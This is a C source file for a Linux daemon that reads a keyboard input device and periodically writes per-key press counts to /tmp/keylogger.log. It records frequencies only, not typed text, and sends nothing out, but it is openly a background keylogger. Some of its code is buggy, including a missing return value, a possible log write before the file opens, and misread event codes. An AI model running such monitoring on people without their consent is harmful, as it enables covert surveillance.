#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>

#include <linux/input.h>

#include "keys_map.h"

#define CONSOLE_OUTPUT 0 // Controls printf output

#define DEV_NAME_LEN 256 // Length of the event device name 

#define EXPIRE_TIME_SEC 5*60 // Five minutes

#define LOG_FILE "/tmp/keylogger.log"

// Count of button presses
static int keys_press_count[KEY_MAX + 1] = {0};

FILE *log_file;

/**
 * Timer callback. All logging is made here.
 */
static void log_by_timer(union sigval sig_val) {
	int i;
	time_t cur_time;
	char *time_str;
	
	// Get time string
	time(&cur_time);
	time_str = ctime(&cur_time);
	
	// Assuming log_file is valid
	fseek(log_file, 0, SEEK_SET);
	fprintf(log_file, "Timestamp: %s\n", time_str); 
	fprintf(log_file, "Code Name Count\n");
	for (i = 0; i < KEY_MAX + 1; i++) {
		if (keys[i] != NULL) {
			fprintf(log_file, "%d %s %d\n", i, keys[i], keys_press_count[i]);
		}
	}
	
	fflush(log_file);
}

/**
 * Open event device and prints info about it
 */
static int init_event_device(char *name) {
	int kb_fd = 0;
	int driver_version = 0;
	char dev_name[DEV_NAME_LEN] = {0};
	struct input_id kb_id;
	
	// Open device
	kb_fd = open(name, O_RDONLY);
	if (kb_fd < 0) {
		perror("Input device open");
		return -1;
	}
	
	// Get driver version, device name etc.
	if (ioctl(kb_fd, EVIOCGVERSION, &driver_version)) {
		perror("EVIOCGVERSION");
		close(kb_fd);
		return -1;
	}
	
	if (ioctl(kb_fd, EVIOCGID, &kb_id)) {
		perror("EVIOCGID");
		close(kb_fd);
		return -1;
	} 
	
	if (ioctl(kb_fd, EVIOCGNAME(DEV_NAME_LEN), dev_name) == -1) {
		perror("EVIOCGNAME");
		close(kb_fd);
		return -1;
	} 

#if CONSOLE_OUTPUT	
	printf("Device info:\n\tDriver version: %d.%d.%d\n\tDevice id: %d:%d:%d:%d\n\tDevice name: %s\n", 
		driver_version >> 16, (driver_version >> 8) & 0xff, driver_version & 0xff, 
		kb_id.bustype, kb_id.vendor, kb_id.product, kb_id.version,
		dev_name);
#endif
		
	return kb_fd;
}

/**
 * Setting up timer with given period.
 */
static int setup_timer(time_t period_sec) {
	timer_t timer_id;
	struct sigevent sig_ev = {0};
	struct itimerspec timer_its = {0};	
	
	// Setting up the timer
	sig_ev.sigev_notify = SIGEV_THREAD;
	sig_ev.sigev_notify_function = log_by_timer;
	if (timer_create(CLOCK_REALTIME, &sig_ev, &timer_id) < 0) {
		perror("Timer create");
		return -1;
	}
	
	timer_its.it_interval.tv_sec = period_sec;
	timer_its.it_interval.tv_nsec = 0;
	timer_its.it_value.tv_sec = 0;
	timer_its.it_value.tv_nsec = 250000; // just not to be zero
	if (timer_settime(timer_id, 0, &timer_its, NULL) < 0) {
		perror("Set time");
		return -1;
	}
}

static void exit_cleanup(void) {
	fflush(log_file);
	fclose(log_file);
}

int main(int argc, char **argv) {
	int kb_fd;
	int n_read = 0;
	
	struct input_event kb_event;
	
	pid_t pid;
	
	// Check args
	if (argc != 2) {
		fprintf(stderr, "Usage: %s /dev/input/eventX\n", argv[0]);
		exit(EINVAL); 
	}

	// Daemonize
	pid = fork();
	switch (pid) {
	case -1:
		perror("fork");
		exit(errno);
	
	// Parent exit
	default:
		exit(EXIT_SUCCESS);

	// Do all the work in the child process
	case 0:	{
		
		printf("Daemon started! Pid: %d\n", getpid());
		
		// Detach him from the terminal // TODO: check umask and setsid necessity
		pid = setsid(); 
		if (pid < 0) {
			perror("setsid");
			exit(errno);
		}
	
		// Register log_file fflush function
		if (atexit(exit_cleanup) < 0) {
			perror("atexit");
		}
		
		// Get event file fd
		kb_fd = init_event_device(argv[1]);
		if (kb_fd < 0) {
			exit(errno);
		}
		
		// Setup logger timer 
		if (setup_timer(EXPIRE_TIME_SEC) < 0) {
			close(kb_fd);
			exit(errno);
		}
		
		// Open log file
		log_file = fopen(LOG_FILE, "w");
		if (log_file == NULL) {
			perror("Open log file");
			close(kb_fd);
			exit(errno);
		}
			
		// Starting listen loop
		while (1) {
			n_read = read(kb_fd, &kb_event, sizeof(struct input_event));
			if (n_read != sizeof(struct input_event)) {
				perror("Read error");
				continue;
			}
			
			// FIXME: 0 is for key press, 1 is for release and 2 is for long press.
			// Maybe there is constant value?
			if (kb_event.type == EV_KEY && kb_event.value == 0) {
#if CONSOLE_OUTPUT
				printf("EVENT: type=%d code=%d (%s) value=%d\n",
					kb_event.type, kb_event.code, keys[kb_event.code], kb_event.value);
#endif
				keys_press_count[kb_event.code]++;
			}
		}
		
		close(kb_fd);
		fclose(log_file);
		
		return 0;
	}
	}
}
